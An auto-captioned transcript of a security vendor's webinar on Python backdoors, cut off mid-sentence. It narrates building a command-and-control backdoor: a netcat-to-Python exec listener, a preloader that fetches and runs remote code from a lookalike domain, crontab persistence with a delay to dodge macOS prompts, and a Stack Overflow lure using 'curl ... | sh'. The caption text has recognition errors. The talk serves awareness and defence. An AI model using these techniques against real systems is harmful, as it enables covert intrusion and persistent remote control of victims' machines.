1
00:00:00,370 --> 00:00:08,209
for the next 30 minutes we're going to

2
00:00:03,950 --> 00:00:09,200
have a presentation from a vendor named

3
00:00:08,210 --> 00:00:11,570
edgewise

4
00:00:09,200 --> 00:00:14,919
from a gentleman named peter smith peter

5
00:00:11,570 --> 00:00:18,198
is the edgewise founder and CEO

6
00:00:14,920 --> 00:00:20,150
self-described serial entrepreneur who

7
00:00:18,199 --> 00:00:22,640
built and deployed Harvard University's

8
00:00:20,150 --> 00:00:26,028
very first knack system before it even

9
00:00:22,640 --> 00:00:27,619
was a security category I really love

10
00:00:26,029 --> 00:00:29,509
that we've got Peter on I'll be honest

11
00:00:27,619 --> 00:00:31,339
with you we we actually talked to Peter

12
00:00:29,509 --> 00:00:34,910
on security weekly about a month ago or

13
00:00:31,339 --> 00:00:37,760
so and I really enjoyed his presentation

14
00:00:34,910 --> 00:00:39,379
and his approach to some of the things

15
00:00:37,760 --> 00:00:41,839
that he's doing at edgewise which are

16
00:00:39,379 --> 00:00:45,010
fairly innovative and rather unique and

17
00:00:41,840 --> 00:00:48,230
so I think this will be an enjoyable

18
00:00:45,010 --> 00:00:50,390
presentation Pete Pete

19
00:00:48,230 --> 00:00:52,279
a lot of experience 10 years of

20
00:00:50,390 --> 00:00:54,019
enterprise expertise as an

21
00:00:52,280 --> 00:00:56,149
infrastructure and security architect of

22
00:00:54,019 --> 00:00:58,010
data centers and customer hosting

23
00:00:56,149 --> 00:01:01,190
environments for Harvard University in

24
00:00:58,010 --> 00:01:04,099
Dekker technology's Oracle American

25
00:01:01,190 --> 00:01:06,740
Express fidelity and so peter has had

26
00:01:04,099 --> 00:01:10,579
some interesting experiences in our

27
00:01:06,740 --> 00:01:12,710
industry which should be no surprise to

28
00:01:10,579 --> 00:01:14,899
just about anybody in in the industry

29
00:01:12,710 --> 00:01:17,689
who's presenting some unique solutions

30
00:01:14,900 --> 00:01:20,240
to today's challenges so it's very it's

31
00:01:17,689 --> 00:01:24,020
very interesting now this is originally

32
00:01:20,240 --> 00:01:26,689
going to be our lunchtime talk I imagine

33
00:01:24,020 --> 00:01:29,929
with the gap that we just had between

34
00:01:26,689 --> 00:01:32,000
the last presentation and now a lot of

35
00:01:29,930 --> 00:01:34,610
folks probably did get out and get

36
00:01:32,000 --> 00:01:37,430
themselves some lunch anyway so without

37
00:01:34,610 --> 00:01:39,920
further ado I'm going to turn it over to

38
00:01:37,430 --> 00:01:41,750
Peter we are just a little bit early but

39
00:01:39,920 --> 00:01:44,479
I guess Pete you can just go ahead and

40
00:01:41,750 --> 00:01:47,960
kick it off awesome thank thank you so

41
00:01:44,479 --> 00:01:50,210
much I do apologize in advance to all of

42
00:01:47,960 --> 00:01:52,250
the viewers I'm feeling a little under

43
00:01:50,210 --> 00:01:54,460
the weather and have a persistent cough

44
00:01:52,250 --> 00:01:56,869
so I'm actually going to use a

45
00:01:54,460 --> 00:02:00,259
pre-recorded version of this talk that

46
00:01:56,869 --> 00:02:01,909
I've given many times so apologies for

47
00:02:00,259 --> 00:02:04,159
that but at the end I will take

48
00:02:01,909 --> 00:02:07,100
questions if there's time so I hope you

49
00:02:04,159 --> 00:02:09,319
enjoy and thanks for watching and so

50
00:02:07,100 --> 00:02:12,319
Peter just just on that topic what we'll

51
00:02:09,318 --> 00:02:13,670
do a quick virtual elbow bump as per

52
00:02:12,319 --> 00:02:16,040
today's core

53
00:02:13,670 --> 00:02:19,450
a protocol I do hope that you don't have

54
00:02:16,040 --> 00:02:23,480
that particular virus but we meet you Oh

55
00:02:19,450 --> 00:02:26,359
fair and and stay healthy for sure

56
00:02:23,480 --> 00:02:28,429
welcome to today's webinar stopping pipe

57
00:02:26,360 --> 00:02:30,110
on base backdoor attacks my name is

58
00:02:28,430 --> 00:02:32,330
Peter Smith I'm the founder and CEO of

59
00:02:30,110 --> 00:02:34,040
edge wise networks today we're gonna

60
00:02:32,330 --> 00:02:36,140
talk about Python based backdoors and

61
00:02:34,040 --> 00:02:37,459
how they're used in data breaches then

62
00:02:36,140 --> 00:02:39,470
we'll talk about the limitations of

63
00:02:37,459 --> 00:02:41,090
existing controls and finally how to

64
00:02:39,470 --> 00:02:43,040
prevent these attacks using Azure Oh

65
00:02:41,090 --> 00:02:44,989
trust approach you likely heard about an

66
00:02:43,040 --> 00:02:47,120
Iran linked threat actor that used a

67
00:02:44,989 --> 00:02:49,160
backdoor against the Turkish government

68
00:02:47,120 --> 00:02:51,080
now Iran in cybersecurity I'm

69
00:02:49,160 --> 00:02:52,940
particularly interesting in today's news

70
00:02:51,080 --> 00:02:55,069
but what was interesting is the

71
00:02:52,940 --> 00:02:57,410
technique that was used specifically a

72
00:02:55,069 --> 00:02:58,940
python-based backdoor they combine stiff

73
00:02:57,410 --> 00:03:00,680
it's done on the internet with some

74
00:02:58,940 --> 00:03:02,420
custom code it turns out if you go to

75
00:03:00,680 --> 00:03:04,400
get up right now and search for a Python

76
00:03:02,420 --> 00:03:06,890
backdoor what you're gonna find is 230

77
00:03:04,400 --> 00:03:09,319
results the question is why is it such a

78
00:03:06,890 --> 00:03:11,390
popular platform for building backdoors

79
00:03:09,319 --> 00:03:13,760
and I think the answer lies in it how

80
00:03:11,390 --> 00:03:15,500
pervasive Python is it's installed by

81
00:03:13,760 --> 00:03:17,750
default on virtually every UNIX

82
00:03:15,500 --> 00:03:19,880
operating system and it's largely covert

83
00:03:17,750 --> 00:03:21,650
if you look in a process table you'll

84
00:03:19,880 --> 00:03:24,290
see a lot of pythons that exist for

85
00:03:21,650 --> 00:03:26,660
legitimate administrative purposes so it

86
00:03:24,290 --> 00:03:28,250
wouldn't be unrealistic to think that a

87
00:03:26,660 --> 00:03:30,769
covert Python script could be

88
00:03:28,250 --> 00:03:33,410
misinterpreted as an admin tool and then

89
00:03:30,769 --> 00:03:35,660
third it's incredibly easy to develop an

90
00:03:33,410 --> 00:03:37,459
entity bug we're gonna actually build a

91
00:03:35,660 --> 00:03:39,500
custom command and control system

92
00:03:37,459 --> 00:03:41,720
written in Python in just a couple lines

93
00:03:39,500 --> 00:03:45,019
of code I would go so far as to say

94
00:03:41,720 --> 00:03:47,630
Python is the powershell of the Linux

95
00:03:45,019 --> 00:03:49,730
and UNIX world let's talk about the

96
00:03:47,630 --> 00:03:51,709
existing controls and the limitations

97
00:03:49,730 --> 00:03:54,290
they have first we've got constrictor I

98
00:03:51,709 --> 00:03:56,120
am to mitigate the threat of these

99
00:03:54,290 --> 00:03:58,548
python-based backdoors unfortunately I

100
00:03:56,120 --> 00:04:00,140
am doesn't help you control what execute

101
00:03:58,549 --> 00:04:01,280
Sora communicates in your environment so

102
00:04:00,140 --> 00:04:03,559
it's not going to be particularly

103
00:04:01,280 --> 00:04:05,269
effective the next one is security

104
00:04:03,560 --> 00:04:07,220
groups which are focused on

105
00:04:05,269 --> 00:04:08,989
communications but they're not protocol

106
00:04:07,220 --> 00:04:12,079
aware they're just a dumb firewall and

107
00:04:08,989 --> 00:04:13,639
they lack default outbound controls it's

108
00:04:12,079 --> 00:04:16,039
mostly about protecting inbound

109
00:04:13,639 --> 00:04:17,590
communication paths and it's got a lot

110
00:04:16,039 --> 00:04:21,139
of limitations there as well so

111
00:04:17,589 --> 00:04:23,570
firewalls of specifically ng FWS they're

112
00:04:21,139 --> 00:04:24,979
very easy to defeat through a few

113
00:04:23,570 --> 00:04:26,539
station many of the techniques we're

114
00:04:24,979 --> 00:04:26,849
going to use today like encoding and

115
00:04:26,539 --> 00:04:28,770
crypt

116
00:04:26,850 --> 00:04:30,810
and so on and so forth and then the last

117
00:04:28,770 --> 00:04:32,370
would be micro segmentation which in

118
00:04:30,810 --> 00:04:34,140
this case we're talking about address

119
00:04:32,370 --> 00:04:36,300
based micro segmentation which gives you

120
00:04:34,140 --> 00:04:38,219
granular control but has the limitations

121
00:04:36,300 --> 00:04:39,630
of security groups and firewalls namely

122
00:04:38,220 --> 00:04:41,130
they aren't protocol aware they're

123
00:04:39,630 --> 00:04:42,690
address port and protocol they don't

124
00:04:41,130 --> 00:04:44,610
know what's really communicating they

125
00:04:42,690 --> 00:04:46,770
can be defeated with encryption or basic

126
00:04:44,610 --> 00:04:48,720
encoding so what we're gonna do is go

127
00:04:46,770 --> 00:04:50,820
through a couple scenarios showing how

128
00:04:48,720 --> 00:04:52,530
it defeats these techniques or these

129
00:04:50,820 --> 00:04:54,750
protection strategies and then show you

130
00:04:52,530 --> 00:04:56,969
the alternate protection strategy which

131
00:04:54,750 --> 00:04:59,820
is an identity based approach using a

132
00:04:56,970 --> 00:05:02,100
zero trust model first let's talk about

133
00:04:59,820 --> 00:05:04,140
a couple scenarios the first scenario is

134
00:05:02,100 --> 00:05:06,060
a basic listening socket that can

135
00:05:04,140 --> 00:05:08,460
receive commands from a remote attacker

136
00:05:06,060 --> 00:05:10,350
but it has a number of limitations the

137
00:05:08,460 --> 00:05:12,359
first limitation is that the attacker

138
00:05:10,350 --> 00:05:14,730
and the target have to both be on the

139
00:05:12,360 --> 00:05:17,220
internal network so this is not a remote

140
00:05:14,730 --> 00:05:18,930
command invocation from outside your

141
00:05:17,220 --> 00:05:21,420
network it is only remote command

142
00:05:18,930 --> 00:05:23,880
invocation from within your network it's

143
00:05:21,420 --> 00:05:25,980
incredibly simple to accomplish so let's

144
00:05:23,880 --> 00:05:28,110
take a closer look what we're gonna do

145
00:05:25,980 --> 00:05:30,450
is we're gonna look at two systems the

146
00:05:28,110 --> 00:05:32,790
first system over here is going to be

147
00:05:30,450 --> 00:05:35,280
the system that listens for remote

148
00:05:32,790 --> 00:05:37,260
commands it uses a combination of netcat

149
00:05:35,280 --> 00:05:39,630
and Python you can see that cat here is

150
00:05:37,260 --> 00:05:42,000
listening on port 8080 and it will keep

151
00:05:39,630 --> 00:05:44,010
open after a command is received it'll

152
00:05:42,000 --> 00:05:45,960
then pipe it into Python with a dash C

153
00:05:44,010 --> 00:05:47,969
which means this is the actual Python

154
00:05:45,960 --> 00:05:50,310
script in plain text that it should

155
00:05:47,970 --> 00:05:53,130
execute the script is incredibly simple

156
00:05:50,310 --> 00:05:56,130
all it does is it says execute anything

157
00:05:53,130 --> 00:05:59,100
you receive via raw input hence the

158
00:05:56,130 --> 00:06:01,530
received via the pipe from that cat so

159
00:05:59,100 --> 00:06:03,540
execute the raw input after decoding it

160
00:06:01,530 --> 00:06:05,820
using base 64 everything that's

161
00:06:03,540 --> 00:06:07,890
transmitted is already encoded in base64

162
00:06:05,820 --> 00:06:11,070
going in plain text across the network

163
00:06:07,890 --> 00:06:13,140
will be executed locally by a Python now

164
00:06:11,070 --> 00:06:15,540
the next system over here is going to

165
00:06:13,140 --> 00:06:18,360
send the command all we do is we echo

166
00:06:15,540 --> 00:06:21,840
out a Python script echo out import OS

167
00:06:18,360 --> 00:06:23,190
print OSP open with the LS dash L commit

168
00:06:21,840 --> 00:06:25,260
we're gonna do something very benign

169
00:06:23,190 --> 00:06:27,840
here just to prove the point and then

170
00:06:25,260 --> 00:06:29,700
print it to the screen now note this is

171
00:06:27,840 --> 00:06:31,799
going to print to the system that

172
00:06:29,700 --> 00:06:34,140
executed the command there is no ability

173
00:06:31,800 --> 00:06:36,180
to receive the response from this

174
00:06:34,140 --> 00:06:38,880
command executing with the netcat based

175
00:06:36,180 --> 00:06:39,880
approach then it encodes it into base64

176
00:06:38,880 --> 00:06:42,010
and sends it to

177
00:06:39,880 --> 00:06:44,469
that cap to be sent over to the remote

178
00:06:42,010 --> 00:06:47,159
command system so let's fire this guy up

179
00:06:44,470 --> 00:06:50,080
and then let's send the remote command

180
00:06:47,160 --> 00:06:52,240
see what it does what you can see here

181
00:06:50,080 --> 00:06:54,310
is that sure enough it did the LS dash L

182
00:06:52,240 --> 00:06:56,710
and it printed it out to the screen now

183
00:06:54,310 --> 00:06:59,860
again this system has a number of

184
00:06:56,710 --> 00:07:01,960
limitations namely it cannot be used by

185
00:06:59,860 --> 00:07:04,750
an attacker from the internet to control

186
00:07:01,960 --> 00:07:07,780
internal systems so let's take a look at

187
00:07:04,750 --> 00:07:10,600
a more sophisticated system now for this

188
00:07:07,780 --> 00:07:12,460
system what we're gonna do is rather

189
00:07:10,600 --> 00:07:14,410
than demonstrate off-the-shelf backdoors

190
00:07:12,460 --> 00:07:15,880
with thousands of lines of code I want

191
00:07:14,410 --> 00:07:17,620
to build a backdoor from scratch and

192
00:07:15,880 --> 00:07:19,540
walk through the anatomy of this system

193
00:07:17,620 --> 00:07:22,000
it's my hope that by sharing the inner

194
00:07:19,540 --> 00:07:23,890
workings of these sorts of systems that

195
00:07:22,000 --> 00:07:26,260
it's gonna raise awareness about just

196
00:07:23,890 --> 00:07:28,300
how significant a threat they pose but I

197
00:07:26,260 --> 00:07:30,460
should point out this is absolutely

198
00:07:28,300 --> 00:07:32,500
unequivocally for educational purposes

199
00:07:30,460 --> 00:07:34,359
only please don't do anything nasty with

200
00:07:32,500 --> 00:07:36,250
this stuff so we've got a couple goals

201
00:07:34,360 --> 00:07:37,720
in the creation of this system first we

202
00:07:36,250 --> 00:07:38,980
want to create a backdoor using the

203
00:07:37,720 --> 00:07:41,620
smallest possible footprint

204
00:07:38,980 --> 00:07:43,600
preferably file s and in fact we are

205
00:07:41,620 --> 00:07:45,730
going to be pylus in this case I want to

206
00:07:43,600 --> 00:07:47,590
make sure that we've got persistence so

207
00:07:45,730 --> 00:07:49,450
that if the administrator notices a

208
00:07:47,590 --> 00:07:51,310
rogue command and they kill it that it

209
00:07:49,450 --> 00:07:53,320
doesn't remove our ability to do command

210
00:07:51,310 --> 00:07:55,360
and control so to distill all of that

211
00:07:53,320 --> 00:07:57,400
down to four simple goals number one I

212
00:07:55,360 --> 00:07:59,170
want it to always work it can't use

213
00:07:57,400 --> 00:08:00,669
non-standard libraries it's got to use

214
00:07:59,170 --> 00:08:02,620
what's on the operating system by

215
00:08:00,670 --> 00:08:04,480
default number two it's gonna always be

216
00:08:02,620 --> 00:08:06,520
available it needs to be resilient to

217
00:08:04,480 --> 00:08:08,650
faults as well as to attempts by the

218
00:08:06,520 --> 00:08:10,570
administrator to correct malicious

219
00:08:08,650 --> 00:08:12,849
behavior number three it has to be

220
00:08:10,570 --> 00:08:15,130
flexible we need to be able to allow any

221
00:08:12,850 --> 00:08:17,200
code to execute and number four it needs

222
00:08:15,130 --> 00:08:19,180
to allow remote invocation without

223
00:08:17,200 --> 00:08:21,460
listening sockets I don't want listening

224
00:08:19,180 --> 00:08:22,900
sockets that require the user to be or

225
00:08:21,460 --> 00:08:24,669
the attacker to be on the internal

226
00:08:22,900 --> 00:08:26,590
network this thing needs to be able to

227
00:08:24,670 --> 00:08:29,590
allow remote invocation from the

228
00:08:26,590 --> 00:08:31,989
internet so what we're gonna do is write

229
00:08:29,590 --> 00:08:35,169
some code in a very procedural style

230
00:08:31,990 --> 00:08:37,120
it's gonna be functioning pseudo code so

231
00:08:35,169 --> 00:08:39,370
to speak really the point is I want the

232
00:08:37,120 --> 00:08:41,440
intent of the code to be perfectly

233
00:08:39,370 --> 00:08:43,479
understandable to programmers and

234
00:08:41,440 --> 00:08:45,700
non-programmers alike what we're gonna

235
00:08:43,479 --> 00:08:47,590
do here is we're gonna have command and

236
00:08:45,700 --> 00:08:50,320
control system in the middle that is

237
00:08:47,590 --> 00:08:52,060
accessible from the attacker via a web

238
00:08:50,320 --> 00:08:54,250
browser they can send

239
00:08:52,060 --> 00:08:55,869
and seek responses over the Internet

240
00:08:54,250 --> 00:08:57,790
through a web browser and then we'll

241
00:08:55,870 --> 00:08:59,529
have software that lives on the target

242
00:08:57,790 --> 00:09:00,969
hosts that communicates with the command

243
00:08:59,529 --> 00:09:02,740
and control system to get the commands

244
00:09:00,970 --> 00:09:05,830
execute it and send the responses back

245
00:09:02,740 --> 00:09:07,600
all of this will be done via HTTP and in

246
00:09:05,830 --> 00:09:10,630
just a couple lines of code I think the

247
00:09:07,600 --> 00:09:13,360
entire system is 50 lines of code total

248
00:09:10,630 --> 00:09:15,460
so what is the anatomy here first

249
00:09:13,360 --> 00:09:16,960
there's a preloader the preloader is the

250
00:09:15,460 --> 00:09:19,180
thing that you are tricked into

251
00:09:16,960 --> 00:09:21,190
executing locally that gets this entire

252
00:09:19,180 --> 00:09:22,719
thing going so it might be a watering

253
00:09:21,190 --> 00:09:24,640
hole attack where you copy and paste

254
00:09:22,720 --> 00:09:26,670
from a website and paste it into your

255
00:09:24,640 --> 00:09:29,500
your command line and now you are

256
00:09:26,670 --> 00:09:31,689
compromised the next thing is the pre

257
00:09:29,500 --> 00:09:34,029
loader loads the bootstrapper the

258
00:09:31,690 --> 00:09:36,130
bootstrapper is the system that actually

259
00:09:34,029 --> 00:09:38,320
does the heavy lifting it connects back

260
00:09:36,130 --> 00:09:39,790
into the control system and says do you

261
00:09:38,320 --> 00:09:42,430
have any commands for me to execute

262
00:09:39,790 --> 00:09:44,110
execute them and then posts the results

263
00:09:42,430 --> 00:09:47,020
back so the attacker can see the output

264
00:09:44,110 --> 00:09:48,580
the next is the persistence layer it's

265
00:09:47,020 --> 00:09:50,650
not sufficient to just trick the

266
00:09:48,580 --> 00:09:52,900
administrator into running a command

267
00:09:50,650 --> 00:09:54,490
once you need to have a foothold in the

268
00:09:52,900 --> 00:09:57,040
system so that if they try to remediate

269
00:09:54,490 --> 00:09:59,170
it comes back again and again and again

270
00:09:57,040 --> 00:10:00,939
and then the last system is the control

271
00:09:59,170 --> 00:10:02,949
system this is the actual system the

272
00:10:00,940 --> 00:10:05,320
attacker interacts with to dispatch

273
00:10:02,950 --> 00:10:06,940
commands down to the targets so with

274
00:10:05,320 --> 00:10:09,190
that let's take a look at the preloader

275
00:10:06,940 --> 00:10:14,020
the pre loader is a very simple piece of

276
00:10:09,190 --> 00:10:15,339
code what it does is a couple things

277
00:10:14,020 --> 00:10:17,530
number one it checks to see if the

278
00:10:15,339 --> 00:10:19,810
bootstrapper is running it checks to see

279
00:10:17,530 --> 00:10:21,760
if the chrome tab has been updated for

280
00:10:19,810 --> 00:10:23,530
persistence if we are not running the

281
00:10:21,760 --> 00:10:25,300
bootstrapper it simply goes and gets it

282
00:10:23,530 --> 00:10:28,060
so let's look at this Python - the

283
00:10:25,300 --> 00:10:30,819
import requests so that we can do HTTP

284
00:10:28,060 --> 00:10:32,229
requests the next section with URL Lib 3

285
00:10:30,820 --> 00:10:34,300
you can ignore it's just so that we

286
00:10:32,230 --> 00:10:35,740
don't post any sort of messages that

287
00:10:34,300 --> 00:10:38,770
might look incorrect to the

288
00:10:35,740 --> 00:10:41,410
administrator the next is exact requests

289
00:10:38,770 --> 00:10:43,720
yet so all we're doing is getting a URL

290
00:10:41,410 --> 00:10:46,390
which is update Python us slash

291
00:10:43,720 --> 00:10:48,400
bootstrap and executing that now this is

292
00:10:46,390 --> 00:10:51,220
really important we chose a URL of

293
00:10:48,400 --> 00:10:52,689
update Python us so it looked benign and

294
00:10:51,220 --> 00:10:55,089
that is actually the command and control

295
00:10:52,690 --> 00:10:57,370
system and all this is doing is it goes

296
00:10:55,089 --> 00:10:58,000
out to the update Python us gets the

297
00:10:57,370 --> 00:10:59,890
bootstrapper

298
00:10:58,000 --> 00:11:02,589
and it executes it locally after it

299
00:10:59,890 --> 00:11:04,689
decodes it in base64 again everything is

300
00:11:02,589 --> 00:11:05,110
obfuscated with encoding now the next

301
00:11:04,690 --> 00:11:07,300
thing it's

302
00:11:05,110 --> 00:11:09,490
is it goes and it tries to modify the

303
00:11:07,300 --> 00:11:11,979
contact and it does something a little

304
00:11:09,490 --> 00:11:13,870
bit tricky on Mackel s so if the content

305
00:11:11,980 --> 00:11:16,240
has not already been manipulated then if

306
00:11:13,870 --> 00:11:18,160
it's Mac OS it sleeps for 15 seconds now

307
00:11:16,240 --> 00:11:19,750
I think an attacker would typically do

308
00:11:18,160 --> 00:11:21,760
something that's much longer like a

309
00:11:19,750 --> 00:11:23,800
minute or five minutes because what this

310
00:11:21,760 --> 00:11:26,439
is doing is on Mac OS if you modify

311
00:11:23,800 --> 00:11:28,689
crontab it prompts you to accept the

312
00:11:26,440 --> 00:11:30,520
changes saying do you want the terminal

313
00:11:28,690 --> 00:11:32,140
to be allowed to modify crontab the

314
00:11:30,520 --> 00:11:33,430
administrator has to click the ok'

315
00:11:32,140 --> 00:11:36,069
button what we want to do is

316
00:11:33,430 --> 00:11:38,380
disassociate the action of running the

317
00:11:36,070 --> 00:11:40,480
preloader with the request to approve

318
00:11:38,380 --> 00:11:42,939
content manipulation and we do that

319
00:11:40,480 --> 00:11:45,700
simply by delaying the action now once

320
00:11:42,940 --> 00:11:47,680
that delay happens then we simply append

321
00:11:45,700 --> 00:11:50,440
that the current crontab with this line

322
00:11:47,680 --> 00:11:52,120
which executes our pre lawyer every

323
00:11:50,440 --> 00:11:54,460
minute and that is the entire

324
00:11:52,120 --> 00:11:56,320
bootstrapper now the key is how do you

325
00:11:54,460 --> 00:11:58,480
get the administrator to actually

326
00:11:56,320 --> 00:12:01,330
execute it so what we're gonna do here

327
00:11:58,480 --> 00:12:03,880
is we're gonna go and do a watering hole

328
00:12:01,330 --> 00:12:07,030
attack so first I'm gonna start my

329
00:12:03,880 --> 00:12:10,210
controller and we're gonna go over to

330
00:12:07,030 --> 00:12:13,060
Google let's say I know that my target

331
00:12:10,210 --> 00:12:14,950
often uses a given service to look up IT

332
00:12:13,060 --> 00:12:16,989
information about how to remediate

333
00:12:14,950 --> 00:12:20,200
issues let's say it was Stack Overflow

334
00:12:16,990 --> 00:12:22,690
the attacker is going to try to respond

335
00:12:20,200 --> 00:12:25,990
to the target with an answer that

336
00:12:22,690 --> 00:12:28,210
includes a malicious URL and trick the

337
00:12:25,990 --> 00:12:30,070
user into pasting it into one of their

338
00:12:28,210 --> 00:12:34,170
systems so let's say me as an

339
00:12:30,070 --> 00:12:38,890
administrator I go and I say install hit

340
00:12:34,170 --> 00:12:43,180
Python three Linux and Stack Overflow

341
00:12:38,890 --> 00:12:46,090
and I've got a couple responses how do I

342
00:12:43,180 --> 00:12:48,790
install pit with Python three yeah that

343
00:12:46,090 --> 00:12:50,800
looks good I'm gonna click on it so as I

344
00:12:48,790 --> 00:12:53,230
look through this guy oh I've got an

345
00:12:50,800 --> 00:12:55,390
approved answer I scroll down I see a

346
00:12:53,230 --> 00:12:57,670
code block which most of us would just

347
00:12:55,390 --> 00:13:00,310
look at that and copy and paste and move

348
00:12:57,670 --> 00:13:04,360
on with our day you can see here what

349
00:13:00,310 --> 00:13:06,520
I've got here is curl - K s HTTP Oh

350
00:13:04,360 --> 00:13:08,020
update Python dot us preloader piped

351
00:13:06,520 --> 00:13:10,960
into the shell

352
00:13:08,020 --> 00:13:14,079
so I mindlessly just select it and come

353
00:13:10,960 --> 00:13:16,570
over here and I say okay I'm gonna paste

354
00:13:14,080 --> 00:13:19,270
it and background it

355
00:13:16,570 --> 00:13:21,310
and run it and did something didn't look

356
00:13:19,270 --> 00:13:23,650
like it was bad so I'm gonna move on to

357
00:13:21,310 --> 00:13:27,760
my other system do the exact same thing

358
00:13:23,650 --> 00:13:30,250
and alright it did something so let's

359
00:13:27,760 --> 00:13:32,650
look at actually what it did when I ran

360
00:13:30,250 --> 00:13:34,510
that command which looked benign I got

361
00:13:32,650 --> 00:13:37,060
it from a watering hole because the

362
00:13:34,510 --> 00:13:39,100
attacker targeted me then what happens

363
00:13:37,060 --> 00:13:40,689
is it gets the bootstrapper what we

364
00:13:39,100 --> 00:13:42,940
talked about before is the preloader

365
00:13:40,690 --> 00:13:46,000
modifies crontab and then kicks off the

366
00:13:42,940 --> 00:13:49,750
bootloader so let's look at crontab

367
00:13:46,000 --> 00:13:50,410
there it is curled - KS update Python

368
00:13:49,750 --> 00:13:54,600
freeloader

369
00:13:50,410 --> 00:13:57,640
okay so we're persistent now what about

370
00:13:54,600 --> 00:14:00,190
is it running yes it is running Python -

371
00:13:57,640 --> 00:14:01,540
see there's my entire bootstrapper so

372
00:14:00,190 --> 00:14:05,370
I'm gonna kill this guy

373
00:14:01,540 --> 00:14:05,370
I go till - 9 and

374
00:14:06,200 --> 00:14:11,120
okay it's gone now is it really gone

375
00:14:08,510 --> 00:14:13,490
though because we modified that contact

376
00:14:11,120 --> 00:14:15,470
and what we're gonna see is within 60

377
00:14:13,490 --> 00:14:17,269
seconds I wish it could go faster but

378
00:14:15,470 --> 00:14:20,450
unfortunately that is the granularity

379
00:14:17,269 --> 00:14:21,950
I've got within the next few minutes

380
00:14:20,450 --> 00:14:23,690
it came back so we've got our

381
00:14:21,950 --> 00:14:25,579
persistence we've got our bootstrapper

382
00:14:23,690 --> 00:14:27,949
now let's see what it's actually doing

383
00:14:25,579 --> 00:14:29,689
with the command and control system for

384
00:14:27,949 --> 00:14:30,649
that we're gonna go over here and we're

385
00:14:29,690 --> 00:14:32,510
gonna look at the command and control

386
00:14:30,649 --> 00:14:35,060
system which what you can see right now

387
00:14:32,510 --> 00:14:38,540
is a bunch of check-ins from Lin user DB

388
00:14:35,060 --> 00:14:40,160
L 1 and the limit app ko1 those are the

389
00:14:38,540 --> 00:14:42,949
two systems that I've deployed this to

390
00:14:40,160 --> 00:14:45,439
now it is interesting taking up a slight

391
00:14:42,949 --> 00:14:47,449
divergence what about Windows well guess

392
00:14:45,440 --> 00:14:49,190
what the exact same script runs on

393
00:14:47,449 --> 00:14:51,380
Windows that yet again is the power of

394
00:14:49,190 --> 00:14:52,910
Python it's multi-platform so we're

395
00:14:51,380 --> 00:14:54,709
gonna go over to a Windows system and

396
00:14:52,910 --> 00:14:57,519
run the exact same thing and see if it

397
00:14:54,709 --> 00:14:57,518
starts check again

398
00:14:59,040 --> 00:15:03,780
alright there's our Active Directory

399
00:15:00,900 --> 00:15:05,699
server windows box a do two right right

400
00:15:03,780 --> 00:15:08,220
there at the top so we've got three

401
00:15:05,700 --> 00:15:09,030
systems connected to Linux boxes one

402
00:15:08,220 --> 00:15:11,220
Windows box

403
00:15:09,030 --> 00:15:12,990
going into this control server now what

404
00:15:11,220 --> 00:15:15,570
is the control server do and what is the

405
00:15:12,990 --> 00:15:18,390
bootstrap or do it so the control system

406
00:15:15,570 --> 00:15:21,210
is a very simple piece of code we're

407
00:15:18,390 --> 00:15:22,800
gonna do the ion control and you can see

408
00:15:21,210 --> 00:15:24,980
there's a bunch of boilerplate here it's

409
00:15:22,800 --> 00:15:27,390
a flask app which makes it even easier

410
00:15:24,980 --> 00:15:30,180
and really the meat of this entire

411
00:15:27,390 --> 00:15:32,939
system can be wrapped up in these one

412
00:15:30,180 --> 00:15:37,560
two three four five six seven eight nine

413
00:15:32,940 --> 00:15:39,330
10 11 12 13 14 15 16 17 18 19 20 lines

414
00:15:37,560 --> 00:15:42,239
of code and what this is doing is

415
00:15:39,330 --> 00:15:44,370
basically looking at a bunch of URL

416
00:15:42,240 --> 00:15:46,650
parameters the arguments for the command

417
00:15:44,370 --> 00:15:48,540
and control system to parse out a target

418
00:15:46,650 --> 00:15:50,670
what is the device we want to control

419
00:15:48,540 --> 00:15:52,829
what is the command we wanted to execute

420
00:15:50,670 --> 00:15:54,990
and what is the response that we

421
00:15:52,830 --> 00:15:57,810
received after the execution was done

422
00:15:54,990 --> 00:16:00,660
and this block of logic literally just

423
00:15:57,810 --> 00:16:02,819
says if you've got a command post it to

424
00:16:00,660 --> 00:16:05,250
the device if you've got a response post

425
00:16:02,820 --> 00:16:07,470
it to the device if you post a device

426
00:16:05,250 --> 00:16:09,330
show it what the actions are that have

427
00:16:07,470 --> 00:16:10,770
been happening very simple stuff here

428
00:16:09,330 --> 00:16:14,190
now the question is what does the

429
00:16:10,770 --> 00:16:16,829
bootstrapper do so if we look at the

430
00:16:14,190 --> 00:16:19,320
bootstrap the bootstrap again some

431
00:16:16,830 --> 00:16:21,090
boilerplate on top and then the bulk of

432
00:16:19,320 --> 00:16:26,220
the code is in this while statement

433
00:16:21,090 --> 00:16:29,400
again 1 2 3 4 5 6 7 8 9 10 11 12 13 14

434
00:16:26,220 --> 00:16:31,800
15 15 lines of code including comments

435
00:16:29,400 --> 00:16:34,110
in one space to accomplish an entire

436
00:16:31,800 --> 00:16:36,930
bootstrap and all this does is it says

437
00:16:34,110 --> 00:16:39,000
while true meaning run this infinitely I

438
00:16:36,930 --> 00:16:40,949
want to get the commands from the

439
00:16:39,000 --> 00:16:42,990
control system that are registered to my

440
00:16:40,950 --> 00:16:46,070
hosting and all it's literally doing is

441
00:16:42,990 --> 00:16:50,310
saying execute the process process open

442
00:16:46,070 --> 00:16:53,580
do a request to this URL which is HTTP

443
00:16:50,310 --> 00:16:56,160
so it's all encrypted to update Python

444
00:16:53,580 --> 00:16:58,950
specify the target the target in this

445
00:16:56,160 --> 00:17:01,860
case is the host name and then get the

446
00:16:58,950 --> 00:17:04,290
commands that should be executed so this

447
00:17:01,860 --> 00:17:06,870
block of code one line this is what

448
00:17:04,290 --> 00:17:09,990
executes the remote commands now once

449
00:17:06,869 --> 00:17:11,899
the command is executed this is the one

450
00:17:09,990 --> 00:17:13,700
line it's I've done some line

451
00:17:11,900 --> 00:17:15,290
brakes to help it with readability but

452
00:17:13,700 --> 00:17:17,839
it's actually just one line of Python

453
00:17:15,290 --> 00:17:19,369
this one line posts the response to the

454
00:17:17,839 --> 00:17:21,800
command invocations of the command and

455
00:17:19,369 --> 00:17:23,780
control system that is it the only other

456
00:17:21,800 --> 00:17:26,000
thing interesting here is that we

457
00:17:23,780 --> 00:17:27,500
randomized the interval for checking

458
00:17:26,000 --> 00:17:29,120
into the command control system I've

459
00:17:27,500 --> 00:17:30,650
done it with a very small interval which

460
00:17:29,120 --> 00:17:32,629
is like between 1 and 3 seconds

461
00:17:30,650 --> 00:17:34,730
randomized I think typically an attacker

462
